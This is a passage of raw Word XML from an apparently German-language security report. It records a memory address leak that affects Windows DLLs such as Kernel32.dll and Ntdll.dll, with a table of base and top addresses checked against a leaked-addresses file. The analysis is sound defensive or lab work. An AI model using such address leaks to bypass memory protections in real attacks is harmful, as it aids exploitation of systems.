      <w:tr w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w14:paraId="220C4494" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3858" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0ACCE4F3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5202" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7177F559" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Leaked_adresses_1.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4BAFB54F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2ECB85D8" w14:textId="648FED09" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00984258" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Es konnte </w:t>
      </w:r>
      <w:r w:rsidR="00347316" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">festgestellt werden, dass folgende DLLs vom Address Leak betroffen sind: Ucrtbase.dll, Kernel32.dll, Ntdll.dll, WS2_32.dll. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFE134E" w14:textId="77777777" w:rsidR="00984258" w:rsidRPr="00B47CB9" w:rsidRDefault="00984258" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="9634" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2689"/>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="1984"/>
        <w:gridCol w:w="2835"/>
      </w:tblGrid>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="37E11279" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="50DA89C2" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>DLL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AE3AC98" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Base</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B612A3F" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Top</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="71251D47" w14:textId="211A2FF3" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">Adresse </w:t>
            </w:r>
            <w:r w:rsidR="009B5D62" w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">in Datei </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Gefunden</w:t>
            </w:r>
            <w:r w:rsidR="009B5D62" w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="3F8F2960" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="508E722A" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>USP10.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="03BE96AB" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77390000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="41A6D6B1" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7742d000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="33683392" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="1B537532" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="723330B2" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>MSVCP140.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="30E0214A" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77251000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2169DAD8" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7257d000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="33388BAF" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="48B40890" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6BC3B09D" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Ucrtbase.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D5B72BE" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6cae0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="484DB8AB" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6cbb8000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="19C8D585" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Ja</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="446109F7" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3DB94D76" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Kernel32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="08DD76D8" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76e00000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3325012E" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76ed5000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15CBBEBD" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Ja</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="62454D13" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="59C81023" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>MSVCRT.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B1FEC86" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>776f0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="42C1BA67" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7779c000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F5530FD" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="62C6CA33" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="17AAB2B6" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Ntdll.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A96BDAC" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77a00000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="53F722E2" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77b42000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2CF23422" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Ja</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="490EFA85" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7F47FC29" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>LPK.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="07A1B7D8" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77284000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="62169230" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>72843000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0966D53B" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="6AD0C01E" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5EADA219" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Sechost.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4630747F" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77b50000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4BF1F6B1" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77b69000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1CAE6E78" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="51927600" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65672686" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>VCRUNTTIME140.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="413DC49C" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>734d0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79AC7E05" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>734e5000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="597AA82C" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="1631CD63" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7AC5CBEB" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>RPCRT4.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="112CE21F" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
